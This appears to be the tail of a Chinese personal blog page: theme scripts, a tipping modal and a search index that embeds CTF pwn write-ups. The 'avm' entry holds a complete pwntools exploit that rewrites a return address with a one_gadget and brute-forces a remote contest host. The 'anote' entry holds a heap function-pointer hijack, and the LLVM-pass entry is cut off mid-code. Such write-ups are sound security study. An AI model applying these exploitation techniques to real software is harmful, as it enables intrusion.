      let navUl = document.querySelector("#site_nav");
      sideBar.style =
        "margin-top:" + (navUl.offsetHeight + navUl.offsetTop + 15) + "px;";
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false,
    MOTION_TIME = 300,
    RIGHT_MOVE_DIS = "320px";

  if (drawerBox) {
    let rightMotions = document.querySelectorAll(".right-motion");
    let right = drawerBox.classList.contains("right");

    let transitionDir = right
      ? "transition.slideRightIn"
      : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingRight: "0px",
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingLeft: "0px",
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, "stop");
      jQuery.Velocity(viewport, "stop");
      jQuery.Velocity(rightMotions, "stop");
      if (open) {
        jQuery.Velocity(
          rightSideBar,
          {
            width: RIGHT_MOVE_DIS,
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, transitionDir, {});
            },
          }
        );
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME,
        });
      } else {
        jQuery.Velocity(
          rightSideBar,
          {
            width: "0px",
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, {
                opacity: 0,
              });
            },
          }
        );
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME,
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle("muse-line");
      }
      drawerBox.classList.toggle(sideBarOpen);
    };
  }

  // 链接跳转
  let newWindow = "false";
  if (newWindow === "true") {
    let links = document.querySelectorAll(".post-body a");
    links.forEach((item) => {
      if (!item.classList.contains("btn")) {
        item.setAttribute("target", "_blank");
      }
    });
  }

  let faSearch = document.querySelector("#fa_search");
  faSearch &&
    faSearch.addEventListener("click", function () {
      document.querySelector("#search_mask").style = "";
    });

  // 代码高亮
  hljs.initHighlightingOnLoad();

  // 离开当前页title变化
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState == "hidden") {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }
</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll(".section img");
  images.forEach((image) => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement("a");
    aelem.href = image.src;
    aelem.dataset["fancybox"] = "images";
    aelem.dataset["rel"] = "fancybox-button";
    aelem.classList.add("fancybox");
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  });
</script>
    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>感谢您的支持，我会继续努力的!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">扫码打赏，你说多少就多少</p>
      <p class="reward-tip"> </p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        jQuery.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        jQuery.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      jQuery.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      jQuery.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

  <div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ciscn-ji-chang-cheng-bei/"" data-c="
          &lt;h1 id=&#34;avm&#34;&gt;avm&lt;/h1&gt;
&lt;p&gt;vm实现了+、-、*、/、^、&amp;amp;、左移、右移、将栈上的地址写一个到bss上的qword_40C0上、将qword_40C0写一个到栈上的地址，挨个进行逆向分析参数和指令识别码&lt;/p&gt;
&lt;h2 id=&#34;vm运行&#34;&gt;vm运行&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734274709780.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
其中a1是qword_40C0，其中a1[32]是当前指令位置，a1[33]是opcode首地址，a1[34]是opcode最大字节数即0x300&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1734274843890.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
和-4按位与后只能是4的倍数，以四个字节取出opcode后又右移了28位作为了识别指令的标识，假如四个字节为&lt;code&gt;\x12\x34\x56\x78&lt;/code&gt;那么也就是0x78563412，右移28位也就是7，所以就此得知如何控制程序执行的函数&lt;/p&gt;
&lt;h2 id=&#34;加&#34;&gt;加&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734274357809.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
后面就是动静结合看下opcode的使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  v2 = *(_DWORD *)(*(_QWORD *)(a1 + 0x108) + (*(_QWORD *)(a1 + 0x100) &amp;amp; 0xFFFFFFFFFFFFFFFCLL));
  *(_QWORD *)(a1 + 0x100) += 4LL;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这两行用作取出当前的opcode，再指向下一个opcode&lt;br&gt;
&lt;code&gt;(a1 + 8LL * (v2 &amp;amp; 0x1F)&lt;/code&gt;qword_40C0的下标是由第一个字节也就是\x12决定的，\x12是写到qword_40C0下标为12的地方，如果是\x22那么下标就是2，由于是和0x1f按位与，所以下标前面有没有1取决于第一个字节也就是\x12高4位是否为奇数&lt;br&gt;
&lt;code&gt;(a1 + 8LL * (HIWORD(v2) &amp;amp; 0x1F))&lt;/code&gt;第一个操作数。HIWORD可以当做是吧opcode向右移两个字节，也就是\x56，再和0x1f按位与，那么下标就是16的位置&lt;br&gt;
&lt;code&gt;(a1 + 8LL * ((v2 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F))&lt;/code&gt;第二个操作数。有个v2 &amp;gt;&amp;gt; 5就和前两个字节有关了，具体可以用计算器，假如如果想用7做下标，那么让7左移5位得到0xe0，那么就需要控制前两个字节为\xe?\x00或者\xf?\x00，这里0xe是偶数，所以第一个操作数下标就是?，0xf是奇数，所以第一个操作数下标是1?&lt;/p&gt;
&lt;h2 id=&#34;前八个操作数&#34;&gt;前八个操作数&lt;/h2&gt;
&lt;p&gt;前八个操作数都类似，和加法类比即可&lt;/p&gt;
&lt;h2 id=&#34;第九个第十个操作数-以及利用方式&#34;&gt;第九个第十个操作数 以及利用方式&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734276255383.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
动态调试发现此处a2是栈上的地址，该功能是把qword_40C0上的数据写到栈上指定的位置&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1734276379794.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
该功能是把栈上指定的位置的数据写到qword_40C0上&lt;br&gt;
程序本身并没有什么可以泄露地址的地方，所以就利用方法就可以猜出，先把栈上的libc相关地址写到qword_40C0上，然后再通过加减乘除左移右移等方式把该地址改成og，然后再把栈上的返回地址修改成og即可，但是经过栈上查找，发现没有离og较近的地址，所以理论上就需要爆破一个半字节，也就是16&lt;em&gt;16&lt;/em&gt;16分之一的概率，但是实际上很好爆（（（，后面主要就是构造og的过程了，由于犯了一些逆天操作，导致比赛没出来😭😭😭😭😭😭，整个抑郁住了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
# elf=ELF(&#39;./pwn&#39;)
# libc=elf.libc
# # p = remote(&#39;39.105.55.245&#39;, 24653)
# p=process(&#39;./pwn&#39;)

# #        cebd3f
# payload = b&#39;\x11\x22\xb8\xa6&#39;  #传入libc地址
# payload += b&#39;\x10\x22\xc0\xa4&#39;  #传入1
# payload += b&#39;\xa5\x20\x10\x14&#39;  #传入1
# payload += b&#39;\x13\x22\x10\x14&#39;  #相加得出右移位数24
# payload += b&#39;\x12\x22\x13\x14&#39; #留奇数
# payload += b&#39;\x13\x22\x13\x14&#39;*22  #10 + 13 -&amp;gt;13
# payload += b&#39;\x10\x22\x11\x14&#39;
# payload += b&#39;\x11\x22\x13\x80&#39; #右移
# payload += b&#39;\x20\x22\x13\x70&#39; #左移 11处
# payload += b&#39;\x63\x22\x13\x34&#39;  #相×得出padding
# payload += b&#39;\x63\x22\x13\x34&#39;  #相×得出padding
# payload += b&#39;\x62\x20\x13\x34&#39;  #相×得出padding
# payload += b&#39;\x43\x20\x12\x34&#39;  #相x得出padding
# payload += b&#39;\x63\x20\x12\x34&#39;  #相×得出padding
# payload += b&#39;\x64\x00\x12\x30&#39;  #相×得出padding
# payload += b&#39;\x86\x00\x12\x30&#39;  #相×得出padding
# payload += b&#39;\xc7\x00\x12\x30&#39;  #相×得出padding
# payload += b&#39;\xe8\x00\x12\x30&#39;  #相×得出padding
# payload += b&#39;\x09\x01\x06\x10&#39;  #相+得出padding
# payload += b&#39;\x2a\x01\x03\x10&#39;*2  #相+得出padding
# payload += b&#39;\x48\x01\x02\x10&#39;  #相+得出padding
# payload += b&#39;\x09\x01\x02\x10&#39;  #相+得出padding
# payload += b&#39;\x2a\x01\x02\x10&#39;  #相+得出padding
# payload += b&#39;\x4a\x01\x02\x10&#39;*7  #相+得出padding
# payload += b&#39;\x41\x02\x13\x30&#39;  #相×得出padding
# payload += b&#39;\x4a\x01\x01\x20&#39;*0x75  #相-得出padding
# payload += b&#39;\x4a\x01\x13\x10&#39;  #相+得出padding
# payload += b&#39;\x4a\x01\x12\x10&#39;*5  #相+得出padding
# payload += b&#39;\xa7\x00\x05\x10&#39;  #相+得出padding
# payload += b&#39;\xeb\x00\x13\x70&#39; #左移
# payload += b&#39;\x6b\x01\x05\x80&#39; #右移
# payload += b&#39;\x6b\x01\x12\x80&#39; #右移
# payload += b&#39;\x4a\x01\x0b\x10&#39;  #相+得出padding
# payload += b&#39;\x51\x01\x00\x10&#39;  #相+得出padding
# payload += b&#39;\xd1\x22\x18\x91&#39; # 11是堆块中的下标 \x18\x91 位置在栈上118也就是需要修改的返回地址
# gdb.attach(p,&#39;b *$rebase(0x00000000000175D)&#39;)
# p.sendafter(&amp;quot;opcode: &amp;quot;,payload)
# p.sendafter(&#39;Unsupported instruction&#39;,&#39;cat flag&#39;)
# p.sendline(&#39;cat flag&#39;)

# p.interactive()

li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + str(x) + &#39;\x1b[0m&#39;)
ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + str(x) + &#39;\x1b[0m&#39;)

rnd = 0
while True:
    try:
        p = remote(&#39;39.105.55.245&#39;, 24653)
        # p=process(&#39;./pwn&#39;)
        rnd += 1
        li(&#39;the &#39; + str(rnd) + &#39; round&#39;)
        
        payload = b&#39;\x11\x22\xb8\xa6&#39;  #传入libc地址
        payload += b&#39;\x10\x22\xc0\xa4&#39;  #传入1
        payload += b&#39;\xa5\x20\x10\x14&#39;  #传入1
        payload += b&#39;\x13\x22\x10\x14&#39;  #相加得出右移位数24
        payload += b&#39;\x12\x22\x13\x14&#39; #留奇数
        payload += b&#39;\x13\x22\x13\x14&#39;*22  #10 + 13 -&amp;gt;13
        payload += b&#39;\x10\x22\x11\x14&#39;
        payload += b&#39;\x11\x22\x13\x80&#39; #右移
        payload += b&#39;\x20\x22\x13\x70&#39; #左移 11处
        payload += b&#39;\x63\x22\x13\x34&#39;  #相×得出padding
        payload += b&#39;\x63\x22\x13\x34&#39;  #相×得出padding
        payload += b&#39;\x62\x20\x13\x34&#39;  #相×得出padding
        payload += b&#39;\x43\x20\x12\x34&#39;  #相x得出padding
        payload += b&#39;\x63\x20\x12\x34&#39;  #相×得出padding
        payload += b&#39;\x64\x00\x12\x30&#39;  #相×得出padding
        payload += b&#39;\x86\x00\x12\x30&#39;  #相×得出padding
        payload += b&#39;\xc7\x00\x12\x30&#39;  #相×得出padding
        payload += b&#39;\xe8\x00\x12\x30&#39;  #相×得出padding
        payload += b&#39;\x09\x01\x06\x10&#39;  #相+得出padding
        payload += b&#39;\x2a\x01\x03\x10&#39;*2  #相+得出padding
        payload += b&#39;\x48\x01\x02\x10&#39;  #相+得出padding
        payload += b&#39;\x09\x01\x02\x10&#39;  #相+得出padding
        payload += b&#39;\x2a\x01\x02\x10&#39;  #相+得出padding
        payload += b&#39;\x4a\x01\x02\x10&#39;*7  #相+得出padding
        payload += b&#39;\x41\x02\x13\x30&#39;  #相×得出padding
        payload += b&#39;\x4a\x01\x01\x20&#39;*0x75  #相-得出padding
        payload += b&#39;\x4a\x01\x13\x10&#39;  #相+得出padding
        payload += b&#39;\x4a\x01\x12\x10&#39;*5  #相+得出padding
        payload += b&#39;\xa7\x00\x05\x10&#39;  #相+得出padding
        payload += b&#39;\xeb\x00\x13\x70&#39; #左移
        payload += b&#39;\x6b\x01\x05\x80&#39; #右移
        payload += b&#39;\x6b\x01\x12\x80&#39; #右移
        payload += b&#39;\x4a\x01\x0b\x10&#39;  #相+得出padding
        payload += b&#39;\x51\x01\x00\x10&#39;  #相+得出padding
        payload += b&#39;\xd1\x22\x18\x91&#39; # 11是堆块中的下标 \x18\x91 位置在栈上118也就是需要修改的返回地址
        p.sendafter(&amp;quot;opcode: &amp;quot;,payload)
        # p.sendafter(&#39;Unsupported instruction&#39;,&#39;cat flag&#39;)
        p.interactive()

    except EOFError:
        p.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;anote&#34;&gt;anote&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734277338936.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;发现&lt;code&gt;(**(void (__cdecl ***)(_DWORD))*(&amp;amp;v25 + v20))(*(&amp;amp;v25 + v20));&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;show功能给出了堆块地址&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1734277332950.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现每次edit之后都会call这个地址指向的地址&lt;/p&gt;
&lt;p&gt;动态调试后发现在edit前一个堆块时可以修改当前堆块的该地址&lt;/p&gt;
&lt;p&gt;事先在堆块里写入后门地址，然后在这个地址写入存放后门地址的堆块地址即可调用后门函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;i386&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
elf=ELF(&#39;./note&#39;)
libc=elf.libc
#io=remote(&#39;47.94.216.142&#39;,32962)
io=process(&#39;./note&#39;)
 
def cmd(choice):
    io.recvuntil(b&amp;quot;Choice&amp;gt;&amp;gt;&amp;quot;)
    io.sendline(str(choice).encode())
 
def add() :
    cmd(1)
 
def show(idx):
    cmd(2)
    io.recvuntil(b&amp;quot;index: &amp;quot;)
    io.sendline(str(idx).encode())
 
def edit(idx,size,content=&#39;a&#39;) :
    cmd(3)
    io.recvuntil(b&amp;quot;index: &amp;quot;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&amp;quot;len: &amp;quot;)
    io.sendline(str(size).encode())
    io.recvuntil(b&amp;quot;content: &amp;quot;)
    io.sendline(content)


backdoor = 0x80489CE
add()
add()
show(0)
io.recvuntil(&amp;quot;0x&amp;quot;)
sys = int(io.recv(7),16)
gdb.attach(io)
edit(0,40,b&#39;a&#39;*20 + p32(backdoor) + p32(sys + 0x1c))
print(&amp;quot;sys = &amp;quot;,hex(sys))

edit(1,40,b&#39;a&#39;*24)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ciscn暨长城杯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/llvm-pwn/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1&#34;&gt;https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;环境配置&#34;&gt;环境配置&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;sudo apt install clang-12 clang-8 llvm-12 llvm-8&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;编译&#34;&gt;编译&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;clang-12 -emit-llvm -S exp.cpp -o exp.ll&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;运行&#34;&gt;运行&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;opt-12 -load ./xxx.so -标识符 ./exp.ll&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;c函数名修饰规则&#34;&gt;c++函数名修饰规则&lt;/h1&gt;
&lt;p&gt;使用gcc或clang编译c++时会经过名称修饰的过程从而改变函数名，修饰后的名称通常包括：&lt;br&gt;
_Z：修饰名称的开始&lt;/p&gt;
&lt;p&gt;N：表示这是一个函数或静态成员函数&lt;/p&gt;
&lt;p&gt;数字：表示函数名称的长度&lt;/p&gt;
&lt;p&gt;类名和函数名：经过编码的类名和函数名&lt;/p&gt;
&lt;p&gt;E：参数列表的开始&lt;/p&gt;
&lt;p&gt;参数类型：通过不同的字母按顺序表示参数类型&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;字母&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;参数类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;i&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;int&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;j&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;unsigned int&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;l&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;x&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;long long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;m&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;unsigned long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;c&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;char&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;h&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;unsigned char&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;b&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;bool&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;结尾：包含额外信息如返回类型&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;例如_ZN4edoc4addiEhii表示在edoc类中的函数名长度为4的函数addi，它的三个参数分别是unsigned char、int、int类型&lt;/p&gt;
&lt;h1 id=&#34;解题&#34;&gt;解题&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1733843158994.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
题目给出了codeVM.so和opt-12以及ld-linux-x86-64.so.2和libc.so.6，需要逆向分析的是code.so文件，动态调试时用的是opt-12&lt;/p&gt;
&lt;h1 id=&#34;动态调试&#34;&gt;动态调试&lt;/h1&gt;
&lt;p&gt;使用&lt;code&gt;gdb opt-12&lt;/code&gt;进行调试，并且通过&lt;code&gt;set args -load ./codeVM.so -Co00o0oOd3 ./exp.ll -f&lt;/code&gt;导入参数，在&lt;code&gt;main&lt;/code&gt;函数下断点，运行至所有llvm::initialize前缀的初始化函数结束，也就是这里&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843559366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
使用&lt;code&gt;vmmap&lt;/code&gt;获取xxx.so的基址，通过IDA中的偏移下断点进行进一步调试（如果没有基址说明初始胡函数还没运行完&lt;br&gt;
其中Co00o0oOd3是在_cxx_global_var_init_17函数中&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843473097.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
在&lt;code&gt;_data_rel_ro&lt;/code&gt;段可以找到程序入口&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843735739.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843758487.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
易推断出&lt;br&gt;
&lt;code&gt;llvm::Value::getName();&lt;/code&gt;用于获取函数名&lt;br&gt;
&lt;code&gt;llvm::operator==(Name, v8, v6[0], v6[1]);&lt;/code&gt;用于比较函数名&lt;br&gt;
所以可以通过在&lt;code&gt;llvm::operator==(Name, v8, v6[0], v6[1]);&lt;/code&gt;处下断点来找出程序函数名&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843967112.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这里获得codeVM.so的基址，然后加上&lt;code&gt;llvm::operator==(Name, v8, v6[0], v6[1]);&lt;/code&gt;在codeVM.so中的偏移即可&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733844073046.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
这里的测试函数是testfunction经过函数名修饰成为_Z12testfunctionv，可以看出程序入口函数需要被修饰为_Z10c0deVmMainv所以得到，程序入口函数名应该是c0deVmMain&lt;/p&gt;
&lt;p&gt;进入vmrun函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__int64 __fastcall `anonymous namespace&#39;::c0oo0o0Ode::vmRun(
        _anonymous_namespace_::c0oo0o0Ode *this,
        llvm::Function *a2)
{
  __int64 v2; // rax
  __int64 result; // rax
  llvm::BasicBlock *v4; // rax
  llvm::BasicBlock *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // [rsp+10h] [rbp-40h] BYREF
  __int64 v15; // [rsp+18h] [rbp-38h] BYREF
  __int64 v16; // [rsp+20h] [rbp-30h] BYREF
  char v17[8]; // [rsp+28h] [rbp-28h] BYREF
  __int64 v18; // [rsp+30h] [rbp-20h] BYREF
  char v19[8]; // [rsp+38h] [rbp-18h] BYREF
  llvm::Function *v20; // [rsp+40h] [rbp-10h]
  _anonymous_namespace_::c0oo0o0Ode *v21; // [rsp+48h] [rbp-8h]

  v21 = this;
  v20 = a2;
  v2 = llvm::errs(this);
  llvm::raw_ostream::operator&amp;lt;&amp;lt;(v2, &amp;quot;Talk is cheap. Show me the code!\n&amp;quot;);
  v18 = llvm::Function::end(a2);
  llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::ilist_iterator&amp;lt;false&amp;gt;(
    v19,
    &amp;amp;v18,
    0LL);
  v16 = llvm::Function::begin(v20);
  llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::ilist_iterator&amp;lt;false&amp;gt;(
    v17,
    &amp;amp;v16,
    0LL);
  while ( 1 )
  {
    result = llvm::operator!=(v17, v19);
    if ( (result &amp;amp; 1) == 0 )
      break;
    v4 = (llvm::BasicBlock *)llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::operator-&amp;gt;(v17);
    v15 = llvm::BasicBlock::begin(v4);
    v5 = (llvm::BasicBlock *)llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::operator-&amp;gt;(v17);
    v14 = llvm::BasicBlock::end(v5);
    while ( (llvm::operator!=(&amp;amp;v15, &amp;amp;v14) &amp;amp; 1) != 0 )
    {
      v6 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 0LL);
      if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v6) &amp;amp; 1) != 0 )
      {
        `anonymous namespace&#39;::c0oo0o0Ode::op1(this, &amp;amp;v15);
      }
      else
      {
        v7 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 1LL);
        if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v7) &amp;amp; 1) != 0 )
        {
          `anonymous namespace&#39;::c0oo0o0Ode::op2(this, &amp;amp;v15);
        }
        else
        {
